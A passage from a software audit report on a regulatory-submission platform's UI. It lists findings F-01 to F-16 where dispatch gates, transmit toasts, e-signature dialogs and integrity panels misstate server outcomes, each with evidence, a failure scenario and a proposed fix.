**Fix.** Thread the request context into registerArtifactWithGovernance (add ipAddress, userAgent, sessionId, userRole to WritebackInput), populate them from getClientIp(req) / req.headers['user-agent'] / the session, and bind them as parameters. Where the caller genuinely has no request (background workers), write a distinguishable marker such as 'system:worker' rather than a plausible-looking loopback address.

### Regulated-workflow UX — review/approval, freeze & e-signature, submission assembly & dispatch, governed export, and AI-authored content presented as authoritative

I read the six named surfaces, the four named `ana` components, their CSS, their callers (`Ana.tsx`, `C2CForm.tsx`, `EsignModal.tsx`), and the server contracts they consume (`mdx-submission-gateway.ts`, `fda-esg.ts`, `external-validator/gate.ts`, `assess-dispatch-readiness.ts`, `verifiedSealService.ts`, `review-board-routes.ts`), against HUMAN_FACTORS_AND_USABILITY_SPEC_2026-06-15.md.

The honesty *intent* in this codebase is real and, in places, better than anything I have reviewed in this category. The transport layer explicitly refuses to fabricate an FDA acknowledgment (`fda-esg.ts:372-382`). The ACK download renames a platform-composed file to `...-NOT-AN-AGENCY-ACK.txt` so the disclaimer survives into the sponsor's archive where the UI cannot follow (`GatewayTransmittals.tsx:175-182`) — that is exemplary. The Review surface had its fake e-sign modal deliberately gutted, credential fields and all, with a comment explaining exactly why (`Review.tsx:79-101`). `DispatchReadiness` is genuinely fixture-free and surfaces "cleared but never adversarially reviewed" as a distinct state — a subtle control most products would never ship.

But the honesty is enforced in the *services* and lost in the *presentation layer*, and every finding below is a place where the UI states something the server did not.

Answering the four questions the brief asks:

**Is draft-vs-official distinguishable without colour alone?** Mostly yes — `SealBadge` carries status as text, `ConcordancePanel` states its method and its sample provenance, `dr2-gate` tiles carry text detail. The exception is severe: on the dispatch gate the *icon and colour actively contradict the text*, and on every governed surface the toast that reports the outcome of a transmit, a seal, or a rollback renders an unconditional green check (`journey-v2.css:435`) — including on "Not transmitted."

**Is uncertainty shown with its denominator?** In `VerificationPanel` and `ConcordancePanel`, yes, and well ("N of M required strings present verbatim"). In `Review.tsx:451-455` a bare AnA confidence percentage is rendered with no denominator, no freshness, no source — the one thing §3.3 says must never appear on a governed surface. `Part11Console` declares `verifiedAt` and never renders it, so the tamper-evidence headline is undated.

**Can a user mistake a draft package for a submittable one, or an unsigned artifact for a signed one?** Yes, three ways: a dispatch gate that reports "every hard gate is proven clear · external validator clean" while the agency-grade validator's error count is non-zero (F-01); a Part 11 seal confirmation whose "You are signing" line is the hardcoded string "Verified document" (F-04); and a verification verdict that gets stamped onto a persisted version it was never run against, which the seal service then accepts on trust (F-06).

**Is a transmission ever implied that did not happen?** Not fabricated — I checked every gateway implementation for a simulate/mock path and there is none; a 201 means bytes actually moved. But the word chosen is wrong in both directions. On success the UI says "Transmitted" and discards the server's own `status: 'in_transit'` and `message: "…awaiting FDA receipt"`, while reading the tracking reference from a field name (`transactionId`) that does not exist in `GatewayTransmitResult` — so the sponsor is told a non-terminal deposit is a completed transmission and is never shown the tracking id (F-03). On a dropped connection the UI asserts "nothing was sent" (F-09), which it cannot know. And `ack1_received` — FDA merely confirming receipt of bytes — renders in the same green chip as `ack3_received`, center acceptance (F-08).

The pattern across all of it: the services were written by someone who understood the regulatory stakes, and the presentation layer was written as if it were a dashboard.

**Genuine strengths in this unit**

- `GatewayTransmittals.tsx:175-182` — the ACK download names the file `concept2cure-transmittal-record-{id}-NOT-AN-AGENCY-ACK.txt` when `X-Ack-Provenance !== 'agency'`, and the toast says the same. This carries the disclaimer into the sponsor's archive, where the UI cannot follow it. It is the single best design decision in the surfaces I reviewed and I have not seen its equal in a competing product.
- `GatewayTransmittals.tsx:98-100` — the rollback dialog states plainly that it records a rollback in *this* platform's audit trail, does NOT retract anything at the agency, and names the real remedy (FDA WebTrader). It refuses the flattering reading of its own action.
- `server/services/submission-gateways/fda-esg.ts:372-382` — after an SFTP put the transmittal is left `in_transit` with a null `ackReceivedAt`, with a comment explaining that marking it `received` would fabricate an FDA acknowledgment. The right call, made explicitly.
- `Review.tsx:79-101` and `:466-468` — the fake e-sign modal was stripped of its password and TOTP fields with a comment noting that a control which collects a password and discards it is indistinguishable from a harvesting UI, and the surface now carries a persistent banner that decisions here are not §11.50 signatures. Deleting a feature because it was dishonest is rare.
- `DispatchReadiness.tsx` overall — genuinely fixture-free (four honest states via `useLiveData`, no sample fallback), and `shadowReviewMissing` surfaces 'Cleared — but never reviewed' as a distinct third verdict rather than collapsing it into green. That is a real human-factors insight about blind spots.
- `ConcordancePanel.tsx:116,139-155` — `dataStatus` defaults to `'sample'` (safe default), the denominator is stated ('N of M claims match verbatim'), and the method is disclosed inline ('a verbatim string comparison, not an AI judgment'). This is exactly the §3.3 trust-calibration pattern.
- `_shared/components/EsignModal.tsx:379-383` — a proper 'You are signing / {target} / {targetMeta}' restatement block, `role="dialog" aria-modal`, `role="alert"` errors, spinner and disabled submit in flight. The control the spec asks for exists and is correctly built.
- `Part11SignModal.tsx` — focus trap, initial focus, real `<label htmlFor>`, a §11.50 meaning `radiogroup`, `role="alert"`, Escape to cancel, and every failure branch ends with 'Nothing was recorded.' The accessible, spec-conformant §11 dialog exists in this repo.
- `SealBadge.tsx:59-60,66` — an explicit comment that status is carried as text and never colour alone, plus a 'Signed and sealed (superseded) · Superseded by v4' state so a stale seal is never shown as current.

#### `P0` F-01 — Dispatch gate reports "external validator clean" and a green check while the agency validator's error count is non-zero

`client/src/concept2cure/v2/surfaces/DispatchReadiness.tsx:227` · blocks **G1** · ~hours

**Evidence.** `:227` hardcodes the phrase from `configured` alone, never from `ran` or `errorCount`: `{ev.configured ? ', external validator clean' : ''}`. `:179` `const externalOk = ev.cleared !== false;`. `server/services/ectd/external-validator/gate.ts:52-66` only pushes blockers when `enforced = requireEvalidator && environment === 'production'`, so with `ECTD_REQUIRE_EVALIDATOR` unset — which `DispatchReadiness.tsx:211` itself calls "default-off" — `cleared` is `true` for any `errorCount`. `:206-209` then renders `detail: ev.errorCount + ' error' + …`, and `:278-283` applies class `ok` with `I.check`; `coverage-v2.css:1448,1455` make that a green top border and a green check glyph. `assess-dispatch-readiness.ts:188-191` also never folds `externalGate.externalErrorCount` into `validationErrors`, despite `gate.ts:20-22` documenting that the caller must.

**Failure scenario.** An RA lead at a sponsor licensed for Lorenz eValidator opens "Cleared to dispatch?" on Friday before a filing window. The deployment does not set ECTD_REQUIRE_EVALIDATOR. eValidator ran and returned 12 error-severity findings. The surface prints the verdict pill "Cleared to dispatch", the lead paragraph "Every hard gate is proven clear… 0 open validation errors, 0 unacknowledged Shadow Review criticals, external validator clean", a green check on the "Agency-grade validator" tile whose own detail line reads "12 errors", and — because `:346` gates on `gate.cleared` — the "Prepare governed transmit" button. The footer at `:341-344` assures her "The AI dispatch-QC task advises; this gate enforces." She transmits. FDA ESG technically rejects the sequence and the filing date is lost.

**Fix.** Three changes, all in the presentation layer. (1) Delete the string at `:227` and replace it with the actual state: `external validator: 12 errors` / `not run` / `not configured`. (2) Change `externalOk` to `ev.configured && ev.ran && ev.errorCount === 0` so the tile's icon and colour agree with its own detail text; render `configured && !ran` as a distinct third 'not run' state, not as a pass. (3) The verdict pill and the transmit button must not read "Cleared" when a configured validator reports errors or has not run — mirror the existing `shadowReviewMissing` pattern with a fourth verdict, "Cleared — agency validator reports 12 errors". Separately fold `externalErrorCount` into the gate server-side as `gate.ts` documents.

#### `P0` F-02 — Every failure on the agency-dispatch surface is announced with a green success check, and nothing is announced to assistive tech at all

`client/src/concept2cure/v2/surfaces/GatewayTransmittals.tsx:64` · blocks **G1** · ~hours

**Evidence.** `:62-65` `C2CToast` renders `<span className="ico">{I.checkCircle}</span>` unconditionally, and `client/src/concept2cure/v2/styles/journey-v2.css:435` sets `.de-toast .ico{color:var(--success);}`. This is the only outcome channel for `:140` 'Not transmitted — re-authentication failed (§11).', `:146` 'Not transmitted — gateway credentials are not configured', `:147` 'Not transmitted — the structural gate rejected the bundle', `:148` 'Transmit failed (HTTP …)', `:167` 'No ACK available', `:182` 'It is NOT an agency acknowledgment', and `:195` 'Rollback failed'. The identical pattern is duplicated at `ReportGovernance.tsx:49-52` and `Review.tsx:62-70`. A grep for `aria-live|role="status"|role="alert"` across all six named surfaces plus `C2CForm.tsx` returns zero matches; the spec makes this a GA pass/fail item at §5 and §3.4.

**Failure scenario.** An RA lead presses Transmit at 16:55 on a filing deadline. Her §11 re-auth fails (expired TOTP). A green check-circle toast appears at the bottom of the screen for 5.2 seconds reading 'Not transmitted — re-authentication failed'. She is scanning, not reading — the spec's own §1.2 assumption is that the worst error is made by a competent, hurried expert — sees green, closes the tab, and reports the sequence as filed. Worse for a screen-reader user: `C2CForm` has no live region and the toast has no `role="status"`, so pressing Transmit produces no announcement of any kind, in either direction. A non-sighted RA lead cannot determine whether an irreversible agency transmission occurred.

**Fix.** Give `C2CToast` a `tone` prop and select the icon and colour from it (`I.checkCircle`/success only on real success, `I.alertTriangle`/error on any 'Not transmitted' or failure path), and wrap it in `role="status" aria-live="polite"` with `aria-live="assertive"` for failures. Do not auto-dismiss a transmit outcome — a §11-governed dispatch result should persist until dismissed. Additionally, surface the server's rejection reason inside the still-open `C2CForm` dialog, not only in a transient toast outside it, so the message is where the focus is.

#### `P0` F-03 — "Transmitted" is reported for a state the server explicitly returns as in_transit and unacknowledged, and the tracking id is read from a field that does not exist

`client/src/concept2cure/v2/surfaces/GatewayTransmittals.tsx:150` · blocks **G2** · ~hours

**Evidence.** `:150` `const txId = (raw as any)?.data?.result?.transactionId ?? (raw as any)?.data?.transactionId;` — `server/services/submission-gateways/types.ts:195-203` defines `GatewayTransmitResult` as `{transmittalId, transmissionId, status, transport, httpStatus, ackReceivedAt, message}`. There is no `transactionId` field anywhere in `server/services/submission-gateways/`, so `txId` is always `undefined`. `:151` then fires `'Transmitted via ' + region.toUpperCase() + '/' + gateway + '.'`, discarding `result.status` (`fda-esg.ts:386` returns `'in_transit'`), `result.message` (`fda-esg.ts:390`: `FDA ESG SFTP upload complete; awaiting FDA receipt. Tracking: …`), and `result.transmissionId` — the reference the sponsor needs to reconcile the filing.

**Failure scenario.** A regulatory operations manager transmits a 2 GB eCTD sequence, which routes over SFTP (`fda-esg.ts:355`). The server deposits it in FDA's /incoming/ and honestly returns `status: 'in_transit'`, `ackReceivedAt: null`, and a message saying FDA has not yet acknowledged it. The UI shows a green check and the single word 'Transmitted', with no reference number, for 5.2 seconds. He records the submission as transmitted in the filing tracker and tells the program team the milestone is met. Neither ack1 nor ack2 ever arrives because the bundle failed FDA's virus scan; nobody notices for four days because the surface already said 'Transmitted'. He also has no tracking id to give FDA when he calls.

**Fix.** Read the fields the contract actually returns. Render the server's own `message` verbatim in the toast, prefix with the real state ('Deposited — awaiting FDA receipt' for `in_transit`, 'Received' only for `received`/ack states), and always show `transmissionId` as the gateway reference. Delete the `transactionId` lookups. Add a contract test asserting the UI's read keys against `GatewayTransmitResult`.

#### `P0` F-04 — The Part 11 seal confirmation's "You are signing" line is the hardcoded string "Verified document" — the signer is never told which document or version they are sealing

`client/src/concept2cure/components/ana/VerificationPanel.tsx:220` · blocks **G2** · ~hours

**Evidence.** `:216-227` passes `target="Verified document"` and `targetMeta="Sealed against the source it was verified against"` as literals to `EsignModal`, which renders them under 'You are signing' (`_shared/components/EsignModal.tsx:379-383`). `VerificationPanelProps` (`:56-81`) has no title, version, or hash prop, so the panel is structurally incapable of naming the artifact — even though the host has both (`Ana.tsx:1145` passes `draft={shownDraft}` with `shownDraft.title`, and `:1150` passes `activeVersionIndex={safeVersionIndex}`). `:122` also sends `printedName: signer?.name ?? ''`. Spec §2 Critical Task 5 names this exact control as the primary mitigation: "The signature manifestation step restates what is being signed — artifact title, scope, version, and a content hash"; §5 repeats it as a GA pass/fail item.

**Failure scenario.** An RA lead has three AnA threads open — M2.7.4 Summary of Clinical Safety, M2.5 Clinical Overview, and an IB section. She switches threads to answer a question, comes back, and the studio pane is showing the M2.5 draft rather than the 2.7.4 she believes is in front of her. She clicks 'Sign and seal verified version'. The confirmation dialog says: 'You are signing: Verified document — Sealed against the source it was verified against.' Nothing on screen distinguishes the two documents. She enters her password and applies an APPROVER §11.50 signature to the wrong artifact. `verifiedSealService.ts` writes an immutable sealed record; non-repudiation is now bound to a document she did not intend to approve.

**Fix.** Add `documentTitle`, `versionLabel`, and `contentHash` to `VerificationPanelProps` and thread them from `Ana.tsx` (`shownDraft.title`, `v${safeVersionIndex + 1}`, and the hash the seal service computes or a client-side SHA-256 of `shownDraft.content`). Pass `target={documentTitle}` and `targetMeta={`${versionLabel} · SHA-256 ${hash.slice(0,16)}…`}`. Also derive `printedName` from the authenticated session rather than a display-name prop that can be empty.

#### `P0` F-05 — An empty live review queue silently renders the full fixture queue as a live work list, including a fabricated audit ID behind a lock icon

`client/src/concept2cure/v2/surfaces/Review.tsx:204` · blocks **G1** · ~days

**Evidence.** `:204-211` `const queueLive = !board.sample && Array.isArray(liveBoard?.queue) && liveBoard!.queue!.length > 0 && …` — `length > 0` is part of the liveness test. `server/routes/review-board-routes.ts:275-288` returns `{success:true, data:{queue: [], workflows:{}, thread:[], meta:{…}}}` for an org with no workflows, which is an honest empty. The client treats that honest empty as "not live", sets `boardSample = true` (`:211`), and falls back to `REVIEW_QUEUE`/`REVIEW_WORKFLOWS`/`REVIEW_THREAD`. The only sample marker is a `SampleTag` inside the left column at `:343`. The `AnswerLead` at `:323-339`, the detail pane, the workflow ladder, and `:462` `<div className="rv-doc-prov">{I.lock} {item.prov}</div>` all render unlabelled. `fixtures/review-data.ts:96` sets that `prov` to `'Drafted by AnA from predicate K221847 + SE matrix · audit AUD-7K2P'`. Spec §2 Critical Task 1 requires the opposite default.

**Failure scenario.** A new tenant is provisioned for a design partner. Their review queue is genuinely empty. The RA lead opens Review & approval and is told, in the answer-first headline with no sample marker, '3 documents are at your sign-off step and need your sign-off — 2 due today.' The detail pane shows a plausible 510(k) substantial-equivalence passage citing predicate K221847 and ISO 10993-11, a '74% confidence' chip, and — behind a padlock — 'audit AUD-7K2P'. A QA auditor in the same session, doing exactly what §1.1 says QA auditors do (probing for unprovenanced data), records a traceability finding against an audit ID that does not exist. The lead meanwhile chases three documents nobody wrote.

**Fix.** Remove `length > 0` from the liveness predicate — a successful response with an empty queue is live and must render `EmptyState`, not fixtures. Longer term, migrate this surface off `useLive`/`SampleTag` onto the `useLiveRows`/`EmptyState` contract the repo already documents as the real-data standard (`dataConnect.tsx:162-172`) and which `SubmissionCenter` and `DispatchReadiness` already follow. Until then, the `SampleTag` must gate the `AnswerLead`, the detail pane, and the provenance line, not just the list column, and fixture `prov` strings containing audit IDs must be nulled.

#### `P1` F-06 — A verification verdict is stamped onto the newest persisted version regardless of which content it ran against, and the seal service accepts it on trust

`client/src/concept2cure/components/ana/Ana.tsx:686` · blocks **G3** · ~days

**Evidence.** `:679-685` scans the whole conversation for the last message carrying both a matching-title draft and a verification, then `:686-693` writes it onto `versions[versions.length - 1]` — the newest *persisted* row — with no check that the verification was produced for that row's content. The comment at `:672-673` states the intent plainly: 'Carry the latest in-session verification onto the newest version so the "verified against your source" panel still shows when applicable.' `VerificationPanel.tsx:109` then sets `canSeal = ok && Boolean(onSeal) && !appliedSeal`, and `server/services/ana/verifiedSealService.ts:136` only checks `input.verification.ok !== true` — it never re-derives the verdict from the content it is sealing, so the client's assertion becomes the immutable record (`:332` persists `verificationMessage`).

**Failure scenario.** A medical writer authors M2.7.4 with `author_docx_native`; AnA runs `verify_docx_against_source` and it passes (v2). She then asks for a surgical edit to the exposure table; the edit tool runs but no verification step follows, and the artifact persists as v3. The studio shows v3 with the green 'Verified against your source — 23 of 23 required strings present verbatim' strip inherited from v2, and offers 'Sign and seal verified version'. She seals v3. The Part 11 record now attests that content which was never verified reproduces its source verbatim — including the exposure figures she just changed.

**Fix.** Bind the verification to the content it ran against: key `versions[i].verification` by a hash of `versions[i].content`, or carry the verified content hash on `VerificationResult` and only attach it when it matches. If no match, render nothing rather than the previous verdict — absence is honest, inheritance is not. Server-side, `sealVerifiedVersion` should recompute the verdict from the submitted content rather than trusting `verification.ok`.

#### `P1` F-07 — The Part 11 seal binds to a version number derived from a client-filtered array index, which can disagree with the server's version numbering

`client/src/concept2cure/components/ana/Ana.tsx:1018` · blocks **G3** · ~days

**Evidence.** `:1018` `const existingVersionNumber = persistedArtifactId ? safeVersionIndex + 1 : undefined;` assumes the rendered array index maps 1:1 onto server version numbers. But `:759-763` builds that array with `data.versions.filter(v => typeof v.content === 'string').map(v => ({content: v.content}))` — any version row without a string `content` (a binary/DOCX-only version, a null content row) is silently dropped, shifting every subsequent index. The version selector at `DocumentStudioPane.tsx:296-300` also labels options `v{i + 1}` from the same index, so the label the signer reads is derived from the same shifted array. `:726-728` additionally documents that fetch failures are silent, so the pane can be showing session-local version numbering with no signal to the user.

**Failure scenario.** An artifact has four persisted versions, one of which (v2) was stored as a rendered DOCX with no text content. The client drops it, showing three options labelled v1, v2, v3. The signer selects the one labelled 'v3 (latest)' — actually server version 4 — and seals. `existingVersionNumber` is sent as 3, so the immutable §11 signature is bound to server version 3, a superseded draft. The SealBadge then displays 'v3 — Approval by …' on screen next to the content of version 4. Non-repudiation is broken in the quietest possible way: everything looks consistent.

**Fix.** Carry the server's own version number on each row instead of inferring it from the array index, and use it for both the selector label and `existingVersionNumber`. Do not silently drop rows the client cannot render — show them as 'v2 — binary version, not previewable' so the numbering stays contiguous. Make the version-history fetch failure visible (a 'version history unavailable — showing this session only' note) rather than silent, per §3.2 honest-recoverable-errors.

#### `P1` F-08 — ack1_received (FDA received the bytes) renders in the same green chip as ack3_received (the center accepted the submission)

`client/src/concept2cure/v2/surfaces/GatewayTransmittals.tsx:75` · blocks **G2** · ~hours

**Evidence.** `:73-78` `if (v.includes('ack') || v.includes('complete') || v.includes('success')) return 'ok';`. `server/services/submission-gateways/types.ts:77-79` distinguishes three regulatorily distinct milestones — `ack1_received` // FDA: receipt-of-transmission, `ack2_received` // virus scan / structure check passed, `ack3_received` // center-specific acceptance. All three match `includes('ack')` and collapse to the same green `rd-chip tone-ok`. The raw enum string is the only differentiator on screen; there is no plain-language meaning anywhere on the surface. Note `received` — which per `:72` means the gateway returned a receipt — does *not* match and renders as `warn`, so the tone scale is not even internally ordered.

**Failure scenario.** A program manager (spec §1.1: intermediate regulatory literacy, relies on at-a-glance status) opens the transmittal log the morning after a filing and sees a green chip on transmittal #412. She reports to the program team that FDA accepted the submission and the PDUFA clock has started. The chip says `ack1_received` — FDA has only confirmed the bytes arrived. Two days later ack2 returns a structure failure and the sequence must be re-filed; the team has already communicated the milestone externally.

**Fix.** Replace the substring heuristic with an explicit status→{tone, label, meaning} map over the real `SubmissionStatus` union. Give ack1 and ack2 an in-progress tone, reserve the success tone for ack3/validation_passed, and render the plain-language meaning next to the enum ('ack1 — FDA received the transmission; center acceptance pending'). The three-ack ladder is the single most misread thing in ESG filing and deserves a first-class affordance, not a substring match.

#### `P1` F-09 — A dropped connection is reported as "nothing was sent" — a claim the client cannot make

`client/src/concept2cure/v2/surfaces/GatewayTransmittals.tsx:148` · blocks **G2** · ~hours

**Evidence.** `:66-72` `readData` catches any thrown fetch and returns `{ok:false, status:0, raw:null}`. `:148` then fires `` `Transmit failed (HTTP ${status}) — ` + ((raw as any)?.error ?? 'nothing was sent') + '.' `` — with `raw` null, the literal string 'nothing was sent' is always chosen for network-level failures. The POST is fully server-side awaited (`mdx-submission-gateway.ts:440` `await gw.transmit(...)`), so a lost response says nothing whatsoever about whether bytes reached the agency.

**Failure scenario.** An RA lead transmits a large sequence from a hotel network; the AS2 upload takes 90 seconds and a proxy times the response out. The UI says 'Transmit failed (HTTP 0) — nothing was sent.' The bytes are at FDA. She reports the filing as failed, escalates to her VP, and either files by an alternate route (creating a duplicate submission at the agency) or lets the window close believing nothing went out. The server-side per-package lock (`mdx-submission-gateway.ts:411-435`) will refuse her retry with a 409 that mentions an 'active transmittal' — which will now read as a contradiction of the message she was just given.

**Fix.** For `status === 0`, state the truth: 'The transmit result did not reach your browser. The transmission may or may not have completed — check the transmittal log below before retrying.' Then refetch the log automatically and scroll the new row into view. Never assert a negative the client cannot observe; §3.2 requires errors to state what failed and the next step, not to guess the outcome.

#### `P1` F-10 — The irreversible agency transmit is keyed on a free-typed integer with no restatement of the package, and region × gateway is an unconstrained cross-product that ignores credential status

`client/src/concept2cure/v2/surfaces/GatewayTransmittals.tsx:86` · blocks **G2** · ~days

**Evidence.** `:53-54` `const REGIONS = ['fda','ema','pmda','ca']; const GATEWAYS = ['esg','cesp','eudamed','pmda_gateway','hc_cesg'];` are two independent `select` fields (`:86-87`) with no dependency between them and no reference to the `configured` flag the gateways table above renders at `:218`. `:88` collects the package as `{key:'packageId', label:'Package id (stored bundle)', type:'number'}` — a raw integer the user types. `C2CForm.tsx:155-201` renders fields and a submit button with no confirmation step, no restatement, and no resolution of that id to a package name, sequence number, size, or sha256 — even though the server has all of it (`mdx-submission-gateway.ts:283-300` reads `metadata.bundle` with `path`, `sha256`, `sizeBytes`, `displayName`). Spec §2 Task 3 requires the region selector to show true per-market capability inline 'so the user cannot select a transmit action that does not exist'; §3.2 requires irreversible acts to get a confirmation that names the artifact.

**Failure scenario.** A regulatory operations associate is transmitting package 42 for Program A. Under deadline he types 41 — the previous program's package, a different sponsor product. Nothing on screen names either package. He completes the §11 re-auth and transmits. Program B's confidential dossier goes to FDA ESG under Program A's submission type. The act is irreversible; `mdx-submission-gateway.ts:463-465` notes the external transmit cannot be undone, and rollback (as the surface correctly says) does not retract it at the agency.

**Fix.** Replace the numeric input with a package picker that lists the org's assembled packages by name, sequence number, size, and sha256 prefix, and add a final restatement step before submit — the same 'You are signing / {target}' pattern `EsignModal` already implements — naming the package, the destination region and gateway, and the consequence ('this cannot be recalled from the agency'). Derive the gateway list from the region and disable, with a visible reason, any gateway whose `configured` is false rather than letting it be selected.

#### `P1` F-11 — Review decisions, change requests and delegations claim persistence and notification that never happen, and attribute comments to a fixture identity

`client/src/concept2cure/v2/surfaces/Review.tsx:263` · blocks **G1** · ~days

**Evidence.** `:250-264` `doReject` performs only `setItemState` and `setThread` — no network call anywhere in the function — then fires `'Changes requested · author notified'`. The textarea placeholder at `:384` promises '(recorded against the document + author notified)'. `:266-281` `doDelegate` is the same shape, firing `'Approval delegated to ' + to`. `:254-259`, `:272-279` and `:289-296` all hardcode `author: 'Jordan Chen'` — an identity from `v2/fixtures/admin-data.ts`, the same fixture name the file's own header comment (`:87`) criticises the old e-sign modal for using. `:374` `setItemState(item.id, 'approved', 'signed')` writes state `'approved'`, which `STATUS_TONE` (`fixtures/review-data.ts:62`) renders as a green `ok` pill in the queue at `:348` — visually identical to a genuinely approved item.

**Failure scenario.** A reg lead reviews a CMC section, writes a detailed change request naming the specific deficiency, and clicks 'Request changes'. The surface tells her the author was notified. Nothing was persisted and no one was notified. The author never sees it; three days later the section goes into the sequence unchanged. Separately, her comment appears in the thread signed 'Jordan Chen · Reg lead' — a person who does not work at her company. Under §11.10(e) an attributed record that misattributes the actor is worse than no record.

**Fix.** Either wire these to the real endpoints or make the copy match the behaviour. Given `Review.tsx` already models this correctly for the e-sign case, apply the same discipline: 'Recorded in this session only — not persisted, and the author has not been notified', and drop the fixture author in favour of the authenticated user (or 'you'). The local `approved` state must not reuse the same green pill as a persisted approval; give it a distinct, textual 'Decision recorded locally' state as the detail pane already does at `:368`.

#### `P1` F-12 — A failed cryptographic integrity check renders identically to a passing one — an unstyled key/value table with no verdict

`client/src/concept2cure/v2/surfaces/ReportGovernance.tsx:152` · blocks **G2** · ~hours

**Evidence.** `:152-162` renders the verify response as `verdictRows(...)` — `:114-117` filters to scalar fields and maps them to `<tr><td>{k}</td><td className="mono">{v}</td></tr>`. There is no verdict headline, no tone, no icon; the card header is the neutral 'Integrity verification · report {id}'. A response of `{valid:false, contentHashMatch:false, …}` and `{valid:true, contentHashMatch:true, …}` differ only by the word 'false' in a grey monospace column. `:156-157` even shows the empty case as 'Verification ran' with a shield-check icon. The panel also persists after `load()` (`:111`), so a verdict from before a seal or revoke stays on screen.

**Failure scenario.** A QA auditor in an audit window clicks Verify on each sealed report to evidence §11.10 tamper detection. Report #7's merkle chain is broken — someone edited a row directly in the database. The panel renders eleven grey rows, the third of which reads `valid | false`. She is checking twelve reports in ten minutes and does not parse it; the audit binder records report #7 as verified. The one control whose entire purpose is to shout does not.

**Fix.** Lead with the verdict: a headline pill ('Integrity intact' / 'Integrity BROKEN — this record has changed since it was sealed') driven by the server's boolean, with an icon and a text label, above the detail table — the same answer-first shape `DispatchReadiness` uses. Clear `verifyRes` whenever the report list refetches so a stale verdict cannot outlive the record it described.

#### `P2` F-13 — Governed action targets are 11.5px bare text links well under the WCAG 2.2 24×24 floor, with Seal and Revoke 6px apart

`client/src/concept2cure/v2/surfaces/ReportGovernance.tsx:137` · blocks **G2** · ~hours

**Evidence.** `:137-144` renders Verify / Provenance / Seal / Revoke as `<button className="nda-open" style={{marginLeft: 6}}>`. `app-v2.css:1651` defines `.nda-open{display:inline-flex;align-items:center;gap:4px;font-size:11.5px;color:var(--accent-200);font-weight:500;}` — no padding, no min-height, so the computed target is roughly 15px tall. The same class carries Status / ACK / Rollback at `GatewayTransmittals.tsx:237-239`. `DispatchReadiness.tsx:321-333` 'Fix' is `padding:4px 10px` at 11px (`coverage-v2.css:1480`) ≈ 21px. `Review.tsx:488` and `:504` use `height: 26`. Spec §3.4 and the §5 GA checklist name 24×24 explicitly.

**Failure scenario.** A QA auditor on a trackpad means to click 'Provenance' on report #7 and lands on 'Seal', 6px to the right, on a 15px-tall target. The justification dialog opens; assuming she mis-clicked into a form she now must fill, she types 'reviewing provenance' and submits — sealing a draft report as an immutable governed record. The action is not reversible except by a revoke, which leaves its own audit entry she now has to explain.

**Fix.** Give `.nda-open` `min-height:32px; padding:0 10px` and widen the gap between destructive and non-destructive actions (or move Seal/Revoke behind an overflow menu, separated from the read-only Verify/Provenance pair). Run the repo's own `accessibility-enforcement` skill over these six surfaces — the spec names it as the gate and it has clearly not been applied here.

#### `P2` F-14 — AnA confidence renders as a bare percentage with no denominator, freshness, or source — the one thing §3.3 forbids on a governed surface

`client/src/concept2cure/v2/surfaces/Review.tsx:451` · blocks **G2** · ~hours

**Evidence.** `:451-455` renders `{Math.round(item.conf * 100)}% confidence` inside a chip whose only additional context is `title="AnA confidence"` — a hover tooltip, unavailable on touch and to most screen-reader configurations. No n, no as-of date, no model or source. Spec §3.3 states 'Every number carries confidence + freshness + source. No bare figures anywhere in a governed surface', and §5 makes it a GA pass/fail. The house example the spec gives is 'Approval probability 0.62, confidence: low, n=24, as of 2026-06-10'. `surfaces-v2.css:240` sets the chip at 10.5px with 2px vertical padding, ≈17px tall.

**Failure scenario.** A reg lead is deciding whether to read the AnA-drafted substantial-equivalence passage closely or to approve it on the strength of the model's own confidence. The chip says '74% confidence'. Seventy-four percent of what — that the citation is right, that the argument holds, that the transcription is faithful? Against how many comparable sections? Computed when? She reads it as 'mostly reliable' and skims. The passage cites a predicate that does not support the wear-duration claim.

**Fix.** Render the confidence with its basis inline, not in a tooltip: '74% confidence · n=24 · as of 2026-06-10 · predicate SE matrix'. Where the backend cannot supply a denominator or freshness (`ReviewItem.conf` is already correctly nullable per `fixtures/review-data.ts:23-25`), render nothing rather than a naked number — the spec's cold-start rule. De-emphasise anything below threshold and exclude it from the approve affordance.

#### `P2` F-15 — The tamper-evidence headline is undated — the server sends verifiedAt and the console declares the field but never renders it

`client/src/concept2cure/v2/surfaces/Part11Console.tsx:36` · blocks **G2** · ~hours

**Evidence.** `:36` declares `verifiedAt?: string;` on `ChainIntegrity`. `server/routes/part11-compliance.ts:913` populates it with `new Date().toISOString()`. The render block at `:96-104` shows `chainStatus`, `integrityValid`, `totalEntries`, `brokenLinks`, `hashAlgorithm`, `chainType` and a truncated `lastHash` — and never `verifiedAt`. No other panel on the surface carries an as-of either: the §11.10 section table (`:115-121`) and the SOC 2 grid (`:130-136`) are undated. Spec §3.3: every number carries confidence + freshness + source.

**Failure scenario.** A QA lead screenshots 'intact · 48,102 chained entries · SHA-256 · linear-hash-chain' into an audit binder as evidence of §11.10 tamper evidence. Six weeks later an inspector asks when that verification was performed. Nothing on the artefact answers it, and the console cannot reproduce the answer for that date. The evidence is worthless.

**Fix.** Render `verifiedAt` next to the chain status as 'Verified 2026-07-28 14:02 UTC', with a re-verify affordance so the reader can refresh it deliberately. Do the same for the §11.10 and SOC 2 panels from whatever timestamp the server supplies. A compliance console whose numbers have no as-of cannot serve its only purpose.

#### `P2` F-16 — The §11.50 manifestation prints a client-derived signer name that falls back to the literal string "current user", and the pre-sign step never restates version or content hash

`client/src/concept2cure/components/ana/Part11SignModal.tsx:162` · blocks **G3** · ~hours

**Evidence.** `:162` `signerName: user?.displayName || [user?.firstName].filter(Boolean).join(' ') || user?.email || 'current user',` — directly contradicting the file's own header at `:20-21`, 'built only from the server's response (never fabricated)'. `:191-206` then renders that value in bold as the printed name of the §11.50 manifestation. The pre-sign view at `:219-221` shows only `request.message ?? request.title`; `Part11SignRequest` (`:45-59`) carries `documentId` and `versionId` but neither is displayed, and no content hash is shown before signing — the §5 GA checklist requires 'artifact title, scope, version, and content hash before signing'. The success view at `:191-206` also drops the `onKeyDown` handler (so Escape stops working) and does not move focus to 'Done', against §3.4.

**Failure scenario.** A signer whose auth context has not fully hydrated — a common state after a token refresh — signs a document approval. The §11.50 manifestation renders '**current user**' as the printed name of the signer. She screenshots it as her signing evidence. Under §11.50(a)(1) the printed name of the signer is mandatory; 'current user' identifies no one, and she has no way to tell from the dialog that the server recorded something different.

